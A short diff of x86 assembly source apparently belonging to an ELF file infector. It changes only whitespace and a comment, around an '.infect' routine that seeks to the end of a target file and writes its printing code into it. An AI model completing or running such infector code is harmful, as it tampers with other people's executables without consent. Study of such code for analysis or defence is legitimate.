@@ -51,7 +51,7 @@
 %define ELFHDR_size 52
 %define ELFHDR_phoff	28
 	
-	global _start
+global _start
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;
 
@@ -94,7 +94,7 @@ _start:
 
 	.infect:
 	lseek dword[ebp-4], 0, SEEK_END ; get to end of file
-	
+	; set up len in bytes of printing code in edx
 	mov edx, _start.nopnop
 	sub edx, _start.print_OutStr
 	write dword[ebp-4], .print_OutStr, edx ; write the print command
